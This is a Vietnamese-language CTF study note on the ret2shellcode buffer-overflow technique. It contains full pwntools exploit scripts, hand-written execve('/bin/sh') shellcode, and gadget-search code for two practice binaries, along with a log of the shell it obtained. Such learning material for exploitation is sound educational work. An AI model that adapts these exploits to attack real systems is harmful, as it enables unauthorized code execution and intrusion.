# ret2shellcode — nhảy vào shellcode tự nhồi

> Tài liệu học sâu. Writeup `bof6` (with-leak) **verify ra shell** (pwntools 4.15). `bof5`
> (no-leak) theo exploit chạy được của repo. Nguồn ở cuối.

---

## 1. Điều kiện tiên quyết: NX tắt

Shellcode chỉ chạy khi vùng chứa nó **thực thi được (X)**. `ret2shellcode` áp dụng khi:
- **NX off** (stack `rwx`), hoặc có segment `GNU_STACK` thiếu/RWX, hoặc vùng ghi+thực thi.
- Kiểm: `checksec` báo **`NX: NX disabled`** hoặc **`NX unknown - GNU_STACK missing`** → ăn.

Nếu **NX bật** → không nhảy vào shellcode trên stack được; phải `mprotect` bật X trước (ROP) hoặc
chuyển sang ret2libc/ROP. (Xem [shellcode.md](pwntools/shellcode.md#cơ-chế-2-bước).)

> Nói ngắn: *nhồi shellcode vào bộ nhớ (ghi được + thực thi được), rồi cho `rip` nhảy vào đầu nó.*

---

## 2. Hai bài toán con: "nhảy vào đâu"

Khó nhất không phải viết shellcode (pwntools lo), mà là **biết địa chỉ shellcode để nhảy vào**.
Hai tình huống:

| | Cách biết địa chỉ | Kỹ thuật |
|-|-------------------|----------|
| **A. Không leak** | một thanh ghi **đã trỏ sẵn** vào buffer lúc `ret` (vd `rax` sau `read`), hoặc buffer ở **địa chỉ cố định** (no-PIE, .bss) | gadget `jmp rsp` / `call rax` / `jmp rax`… |
| **B. Có leak** | **leak địa chỉ stack**, đặt shellcode trên stack, ghi `ret = địa_chỉ_shellcode` | leak rồi tính offset |

---

## 3. Sinh shellcode (pwntools)

```python
context.arch = 'amd64'
sc = asm(shellcraft.sh())                 # execve("/bin/sh") chuẩn
# hoặc tự viết gọn (execve /bin/sh):
sc = asm('''
    mov rax, 0x68732f6e69622f  /* "/bin/sh\\0" */
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b              /* SYS_execve */
    syscall
''', arch='amd64')
```
Chi tiết `shellcraft`/`asm`, đa kiến trúc, né byte xấu: [shellcode.md](pwntools/shellcode.md).

---

## 4. Writeup B — `bof6` (with leak, verify ra shell)

Menu: chọn `1` để **in lại** buffer (leak), chọn `2` để **ghi tràn**. Ghi `A`*0x50 rồi nó echo
→ **leak địa chỉ stack**; sau đó nhồi shellcode + ghi `ret` = địa chỉ shellcode trên stack.

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./bof6", checksec=False)
set_remote("host", 0)
p = start()

### Stage 1: leak địa chỉ stack qua echo
sla("> ", b"1")
sa("> ", b"A"*0x50)
ru(b"A"*0x50)
leak = uu64(rc(6))                    # 6 byte địa chỉ stack echo lại
li(f"stack leak = {hex(leak)}")

### Stage 2: nhồi shellcode lên stack + nhảy vào nó
sc = asm('''
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
''', arch='amd64')
payload = sc.ljust(520, b"\x90") + p64(leak - 0x220)   # ret -> đầu shellcode
sla("> ", b"2")
sa("> ", payload)

ia()
```

- `leak - 0x220`: địa chỉ **đầu buffer shellcode** so với con trỏ leak được — dò bằng GDB một lần
  (so sánh `leak` với địa chỉ buffer), rồi hardcode.
- `.ljust(520, b"\x90")`: NOP-pad cho đủ tới chỗ `ret` (shellcode ngắn hơn offset).
- **Không cần căn lề** như `system` — ta tự viết shellcode, syscall không kén `rsp%16`.

**Log chạy thật:** `stack leak = 0x7ffc94648670` → `$ id` → `uid=1000(...)` ✅

---

## 5. Writeup A — `bof5` (no leak, `call rax`)

Không leak được, nhưng sau lần `read` đầu, **`rax` trỏ vào buffer** chứa dữ liệu ta vừa gửi. Chỉ
cần một gadget **`call rax`** (byte `\xff\xd0`) trong vùng thực thi:

```python
sc = asm(shellcraft.amd64.linux.sh(), arch='amd64')     # hoặc execve tự viết
# tìm BYTE 'call rax' trong vùng exec (find_gadget chỉ thấy gadget kết thúc bằng ret):
call_rax = next(exe.search(asm("call rax"), executable=True))

sa("> ", sc)                        # lần read 1: nhồi shellcode (rax sẽ trỏ vào đây)
sa("> ", flat(cyclic(536), call_rax))   # tràn: ret -> 'call rax' -> nhảy vào shellcode
```

Mấu chốt: **một thanh ghi còn trỏ vào shellcode lúc `ret`** → dùng `jmp/call <reg>`. Biến thể hay
gặp: `jmp rsp` (shellcode nằm **ngay sau** `ret`), `call rax`, `jmp rax`. Tìm:
```python
jmp_rsp = next(exe.search(asm("jmp rsp"), executable=True))   # \xff\xe4
```

---

## 6. Cạm bẫy

- **ASLR (with-leak):** địa chỉ stack đổi mỗi lần chạy → **phải leak trong cùng tiến trình** rồi
  dùng ngay; leak run này không dùng cho run khác.
- **Byte xấu:** nếu input qua `scanf("%s")`/`gets` → shellcode không được chứa `\x00`, `\n`,
  khoảng trắng. `read` thì thường thoải mái. Né bằng [encoders](pwntools/advanced.md#encoders--né-byte-xấu--shellcode-ascii).
- **`find_gadget` KHÔNG thấy `call rax`/`jmp rsp`** (chúng không kết bằng `ret`) → dùng
  `exe.search(asm("jmp rsp"), executable=True)`.
- **Buffer quá ngắn** cho shellcode → nhồi shellcode ở nơi khác (bss qua read) rồi nhảy, hoặc
  stage nhỏ gọi `read` thêm (xem [shellcode.md](pwntools/shellcode.md#cơ-chế-2-bước)).

---

## 7. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`BOF_ret2shellcode_no_leak`** (bof5) | ⭐⭐ | `call rax`, buffer qua reg | **§5** (có `exploit.py`) |
| **`BOF_ret2shellcode_with_leak`** (bof6) | ⭐⭐ | leak stack + nhồi shellcode | **§4** verify ra shell (có `solve.py`) |
| **`jmp rsp` cổ điển** | ⭐ | shellcode ngay sau ret | tìm `jmp rsp`, payload = pad+`jmp rsp`+shellcode |
| NX bật → cần bật X | ⭐⭐⭐ | `mprotect` rồi nhảy | ghép [ROP](pwntools/rop.md) + [constants](pwntools/shellcode.md#constants--hằng-số-syscallcờ) |

**Lộ trình:** `jmp rsp` cơ bản → bof5 (`call rax`) → bof6 (leak + stack) → NX bật dùng `mprotect`.

---

## Nguồn tham khảo

- ir0nstone — *What is ret2shellcode*:
  <https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2shellcode>
- Sinh shellcode: [shellcode.md](pwntools/shellcode.md) · né byte xấu: [advanced.md](pwntools/advanced.md#encoders--né-byte-xấu--shellcode-ascii)
